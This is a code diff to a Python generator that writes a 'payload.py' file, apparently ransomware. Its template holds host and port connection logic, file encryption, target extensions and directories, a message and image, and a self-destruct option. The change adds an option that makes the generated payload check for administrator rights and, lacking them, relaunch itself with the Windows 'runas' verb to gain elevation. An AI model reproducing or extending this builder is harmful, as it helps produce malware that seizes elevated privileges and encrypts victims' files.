@@ -1,10 +1,12 @@
 import platform
 
-def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug, ext, dirs, destruct, working_dir):
+def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug, ext, dirs, destruct, working_dir, runas):
     demon = """import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
 from pathlib import Path
 <ttk>
+
+<runas>
 
 <import_random>
 <import_aes>
@@ -99,12 +101,10 @@ def connector():
         <start_gui>
         pass
 
-try:
-    connector()
-except KeyboardInterrupt:
-    sys.exit(0)
+<runas>
 
-    """
+<runas>
+"""
 
     gui = """
 class mainwindow(Tk):
@@ -168,6 +168,27 @@ class mainwindow(Tk):
     ttk = '''from tkinter import *
 from tkinter.ttk import *
 from io import BytesIO
+'''
+    runas_user = '''try:
+    connector()
+except KeyboardInterrupt:
+    sys.exit(0)
+'''
+
+    runas_def = '''def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+'''
+
+    runas_check = '''if is_admin():
+    try:
+        connector()
+    except KeyboardInterrupt:
+        sys.exit(0)
+else:
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
 '''
 
     ext_list = ''
@@ -294,6 +315,15 @@ def encrypt_file(file_name, key):
         photo = PIL.ImageTk.PhotoImage(resized)"""
         demon = demon.replace('<import_pil>', 'import PIL.Image, PIL.ImageTk')
         demon = demon.replace('<load_image>', load_image)
+
+    if runas == 0:
+        demon = demon.replace('<runas>', '', 1)
+        demon = demon.replace('<runas>', '', 1)
+        demon = demon.replace('<runas>', runas_user, 1)
+    else:
+        demon = demon.replace('<runas>', 'import ctypes', 1)
+        demon = demon.replace('<runas>', runas_def, 1)
+        demon = demon.replace('<runas>', runas_check, 1)
 
 
     with open('./payload.py', 'w') as f:
